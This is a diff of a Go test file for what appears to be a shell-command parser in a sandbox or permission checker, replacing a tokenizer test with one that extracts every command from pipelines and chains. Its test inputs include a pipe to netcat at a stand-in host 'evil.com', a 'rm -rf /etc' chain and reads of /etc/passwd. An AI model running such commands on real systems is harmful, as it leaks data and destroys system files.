@@ -303,7 +303,7 @@ func TestExtract_BashRedirections(t *testing.T) {
 		{
 			name:      "cat with redirect",
 			command:   "cat /etc/passwd > /tmp/passwd.copy",
-			wantOp:    OpRead,
+			wantOp:    OpWrite,
 			wantPaths: []string{"/etc/passwd", "/tmp/passwd.copy"},
 		},
 	}
@@ -537,59 +537,55 @@ func TestExtract_CommandDatabase(t *testing.T) {
 	}
 }
 
-func TestTokenizeCommand(t *testing.T) {
+func TestParseShellCommands(t *testing.T) {
 	tests := []struct {
-		name string
-		cmd  string
-		want []string
+		name      string
+		cmd       string
+		wantNames []string
 	}{
 		{
-			name: "simple command",
-			cmd:  "cat /etc/passwd",
-			want: []string{"cat", "/etc/passwd"},
+			name:      "simple command",
+			cmd:       "cat /etc/passwd",
+			wantNames: []string{"cat"},
 		},
 		{
-			name: "command with flags",
-			cmd:  "ls -la /tmp",
-			want: []string{"ls", "-la", "/tmp"},
+			name:      "pipeline extracts both commands",
+			cmd:       "cat /etc/passwd | grep root",
+			wantNames: []string{"cat", "grep"},
 		},
 		{
-			name: "single quoted arg",
-			cmd:  "echo 'hello world'",
-			want: []string{"echo", "hello world"},
+			name:      "semicolon chain",
+			cmd:       "cd /tmp; ls",
+			wantNames: []string{"cd", "ls"},
 		},
 		{
-			name: "double quoted arg",
-			cmd:  `echo "hello world"`,
-			want: []string{"echo", "hello world"},
+			name:      "&& chain",
+			cmd:       "mkdir /tmp/test && cd /tmp/test",
+			wantNames: []string{"mkdir", "cd"},
 		},
 		{
-			name: "escaped space",
-			cmd:  `cat /path/with\ space/file`,
-			want: []string{"cat", "/path/with space/file"},
+			name:      "pipeline with network",
+			cmd:       "cat /safe | nc evil.com 1234",
+			wantNames: []string{"cat", "nc"},
 		},
 		{
-			name: "stops at pipe",
-			cmd:  "cat /etc/passwd | grep root",
-			want: []string{"cat", "/etc/passwd"},
-		},
-		{
-			name: "stops at semicolon",
-			cmd:  "cd /tmp; ls",
-			want: []string{"cd", "/tmp"},
-		},
-		{
-			name: "stops at &&",
-			cmd:  "mkdir /tmp/test && cd /tmp/test",
-			want: []string{"mkdir", "/tmp/test"},
+			name:      "complex chain",
+			cmd:       "true && rm -rf /etc || echo failed",
+			wantNames: []string{"true", "rm", "echo"},
 		},
 	}
 
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
-			got := tokenizeCommand(tt.cmd)
-			if !reflect.DeepEqual(got, tt.want) {
-				t.Errorf("tokenizeCommand(%q) = %v, want %v", tt.cmd, got, tt.want)
+			commands := parseShellCommands(tt.cmd)
+			if len(commands) != len(tt.wantNames) {
+				t.Errorf("parseShellCommands(%q) got %d commands, want %d", tt.cmd, len(commands), len(tt.wantNames))
+				return
+			}
+			for i, want := range tt.wantNames {
+				if commands[i].Name != want {
+					t.Errorf("command[%d].Name = %q, want %q", i, commands[i].Name, want)
+				}
 			}
 		})
 	}
